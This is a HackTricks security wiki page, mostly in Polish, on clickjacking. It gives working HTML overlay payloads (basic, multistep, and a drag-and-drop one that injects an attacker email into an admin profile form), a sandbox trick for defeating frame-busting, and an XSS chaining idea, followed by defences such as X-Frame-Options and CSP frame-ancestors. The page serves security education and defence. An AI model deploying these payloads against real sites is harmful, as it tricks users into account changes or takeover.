# Clickjacking

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby łatwo tworzyć i **automatyzować przepływy pracy** przy użyciu najbardziej zaawansowanych narzędzi społecznościowych na świecie.\
Otrzymaj dostęp już dziś:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Czym jest Clickjacking

W ataku clickjacking, **użytkownik** zostaje **oszukany**, aby **kliknąć** na **element** na stronie internetowej, który jest albo **niewidoczny**, albo udaje inny element. Ta manipulacja może prowadzić do niezamierzonych konsekwencji dla użytkownika, takich jak pobieranie złośliwego oprogramowania, przekierowanie na złośliwe strony internetowe, udostępnianie poświadczeń dostępu lub poufnych informacji, transfer pieniędzy lub zakup produktów online.


### Trik z wypełnianiem formularzy

Czasami możliwe jest **wypełnienie wartości pól formularza za pomocą parametrów GET podczas ładowania strony**. Atakujący może wykorzystać to zachowanie, aby wypełnić formularz dowolnymi danymi i wysłać payload clickjacking, aby użytkownik nacisnął przycisk Wyślij.

### Wypełnij formularz za pomocą przeciągnij i upuść

Jeśli potrzebujesz, aby użytkownik **wypełnił formularz**, ale nie chcesz bezpośrednio prosić go o wpisanie określonych informacji (takich jak adres e-mail i/lub hasło, których znasz), możesz poprosić go tylko o **przeciągnięcie i upuszczenie** czegoś, co wpisze Twoje kontrolowane dane, jak w [**tym przykładzie**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).

### Podstawowy Payload
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Wieloetapowy Payload

To execute a successful clickjacking attack, you can use a multistep payload. This involves dividing the attack into multiple steps to bypass certain security measures.

A typical multistep payload consists of the following steps:

1. **Step 1: Load the target page**: The attacker loads the target page within an iframe on their own malicious website.

2. **Step 2: Overlay an invisible element**: The attacker overlays an invisible element, such as a button or a link, on top of the target page. This element will be used to capture the user's click.

3. **Step 3: Trick the user into clicking**: The attacker employs various techniques to trick the user into clicking on the invisible element. This can include disguising the element as a legitimate button or link, or using social engineering techniques to manipulate the user's behavior.

4. **Step 4: Perform the malicious action**: Once the user clicks on the invisible element, the attacker can perform the desired malicious action. This can include submitting a form, making a purchase, or executing any other action that the user unwittingly initiated.

By using a multistep payload, the attacker can increase the chances of a successful clickjacking attack by bypassing security measures that may be in place to detect and prevent single-step attacks.
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Przeciągnij i upuść + kliknij payload

This technique combines the use of drag and drop functionality with a click event to execute a payload. It takes advantage of the fact that certain elements on a webpage can be dragged and dropped, and that a click event can be triggered when the element is dropped.

To perform a drag and drop + click attack, the attacker first needs to identify a draggable element on the target webpage. This can be done by inspecting the webpage's source code or using browser developer tools.

Once the draggable element is identified, the attacker can create a payload that will be executed when the element is dropped. The payload can be a malicious script or a URL that redirects the user to a malicious website.

To execute the attack, the attacker needs to trick the victim into dragging and dropping the element. This can be done by overlaying the draggable element with an invisible or transparent element that the victim is likely to click on. When the victim clicks on the overlay element, they unknowingly trigger the drag and drop event, which in turn triggers the click event and executes the payload.

This technique can be used to perform various types of attacks, such as stealing sensitive information, performing actions on behalf of the victim, or redirecting the victim to a malicious website.

To protect against drag and drop + click attacks, web developers should validate and sanitize user input, implement click event handlers that prevent unauthorized execution of payloads, and educate users about the risks of interacting with draggable elements on untrusted websites.
```markup
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

Jeśli zidentyfikowano **atak XSS, który wymaga od użytkownika kliknięcia** w pewien element, a strona jest **podatna na clickjacking**, można go wykorzystać, aby oszukać użytkownika i zmusić go do kliknięcia przycisku/linku.\
Przykład:\
_Znalazłeś **self XSS** w prywatnych danych konta (dane, które **tylko ty możesz ustawić i odczytać**). Strona z **formularzem** do ustawiania tych danych jest **podatna** na **clickjacking**, i możesz **wypełnić** formularz za pomocą parametrów GET._\
\_\_Atakujący może przygotować atak **clickjacking** na tę stronę, **wypełniając** formularz **XSS payloadem** i **oszukując** użytkownika, aby **przesłał** formularz. Gdy formularz zostanie przesłany i wartości zostaną zmodyfikowane, **użytkownik uruchomi XSS**.

## Strategie łagodzenia Clickjacking

### Obrona po stronie klienta

Skrypty wykonane po stronie klienta mogą podejmować działania w celu zapobiegania Clickjackingowi:

* Upewnienie się, że okno aplikacji jest główne lub najwyższe.
* Uczynienie wszystkich ramek widocznymi.
* Zapobieganie klikaniu w niewidoczne ramki.
* Wykrywanie i informowanie użytkowników o potencjalnych próbach Clickjackingu.

Jednak te skrypty łamiące ramki mogą być obejśczone:

* **Ustawienia bezpieczeństwa przeglądarek:** Niektóre przeglądarki mogą blokować te skrypty na podstawie swoich ustawień bezpieczeństwa lub braku obsługi JavaScript.
* **Atrybut HTML5 iframe `sandbox`:** Atakujący może zneutralizować skrypty łamiące ramki, ustawiając atrybut `sandbox` z wartościami `allow-forms` lub `allow-scripts`, bez `allow-top-navigation`. Zapobiega to sprawdzaniu przez iframe, czy jest to najwyższe okno, np.
```html
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms allow-scripts"></iframe>
```
Wartości `allow-forms` i `allow-scripts` umożliwiają działania w ramce, jednocześnie wyłączając nawigację na najwyższym poziomie. Aby zapewnić zamierzoną funkcjonalność docelowej strony, mogą być konieczne dodatkowe uprawnienia, takie jak `allow-same-origin` i `allow-modals`, w zależności od rodzaju ataku. Komunikaty konsoli przeglądarki mogą wskazywać, jakie uprawnienia należy zezwolić.

### Obrona po stronie serwera

#### Nagłówek odpowiedzi HTTP `X-Frame-Options`

Nagłówek odpowiedzi HTTP **`X-Frame-Options`** informuje przeglądarki o legalności renderowania strony w elemencie `<frame>` lub `<iframe>`, pomagając w zapobieganiu Clickjackingowi:

* `X-Frame-Options: deny` - Żadna domena nie może osadzać zawartości.
* `X-Frame-Options: sameorigin` - Tylko bieżąca witryna może osadzać zawartość.
* `X-Frame-Options: allow-from https://trusted.com` - Tylko określony adres 'uri' może osadzać stronę.
* Należy zauważyć ograniczenia: jeśli przeglądarka nie obsługuje tej dyrektywy, może nie działać. Niektóre przeglądarki preferują dyrektywę CSP frame-ancestors.

#### Dyrektywa `frame-ancestors` w polityce bezpieczeństwa zawartości (CSP)

**Dyrektywa `frame-ancestors` w CSP** jest zalecaną metodą ochrony przed Clickjackingiem:

* `frame-ancestors 'none'` - Podobne do `X-Frame-Options: deny`.
* `frame-ancestors 'self'` - Podobne do `X-Frame-Options: sameorigin`.
* `frame-ancestors trusted.com` - Podobne do `X-Frame-Options: allow-from`.

Na przykład, poniższa polityka CSP pozwala tylko na osadzanie z tej samej domeny:

`Content-Security-Policy: frame-ancestors 'self';`

Szczegółowe informacje i przykładowe złożone przypadki można znaleźć w [dokumentacji CSP dotyczącej dyrektywy frame-ancestors](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) oraz w [dokumentacji CSP frame-ancestors Mozilli](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors).

### Polityka bezpieczeństwa zawartości (CSP) z `child-src` i `frame-src`

**Polityka bezpieczeństwa zawartości (CSP)** to środek bezpieczeństwa, który pomaga w zapobieganiu Clickjackingowi i innym atakom polegającym na wstrzykiwaniu kodu, określając, które źródła przeglądarka powinna zezwolić na ładowanie zawartości.

#### Dyrektywa `frame-src`
- Określa prawidłowe źródła dla ramek.
- Bardziej szczegółowa niż dyrektywa `default-src`.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
Ta polityka umożliwia ramki z tego samego źródła (self) oraz https://trusted-website.com.

#### Dyrektywa `child-src`
- Wprowadzona w CSP poziomu 2, aby ustawić prawidłowe źródła dla pracowników sieciowych i ramek.
- Działa jako fallback dla dyrektyw frame-src i worker-src.
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
Ta polityka pozwala na ramki i workery z tego samego źródła (self) oraz https://trusted-website.com.

**Uwagi dotyczące użycia:**
- Wycofywanie: child-src jest stopniowo zastępowane przez frame-src i worker-src.
- Zachowanie awaryjne: Jeśli frame-src jest nieobecne, child-src jest używane jako awaryjne dla ramek. Jeśli oba są nieobecne, używane jest default-src.
- Ścisłe określenie źródła: W dyrektywach należy uwzględnić tylko zaufane źródła, aby zapobiec wykorzystaniu.

#### Skrypty JavaScript łamiące ramki

Choć nie są one całkowicie niezawodne, skrypty oparte na JavaScript mogą być używane do uniemożliwienia osadzania strony internetowej w ramce. Przykład:
```javascript
if (top !== self) {
top.location = self.location;
}
```
#### Wykorzystanie tokenów Anti-CSRF

* **Walidacja tokenów:** W aplikacjach internetowych używaj tokenów Anti-CSRF, aby upewnić się, że żądania zmieniające stan są wykonywane celowo przez użytkownika, a nie przez stronę Clickjacked.

## Referencje

* [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
* [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby łatwo tworzyć i **automatyzować zadania** przy użyciu najbardziej zaawansowanych narzędzi społecznościowych na świecie.\
Zdobądź dostęp już dziś:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi trikami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
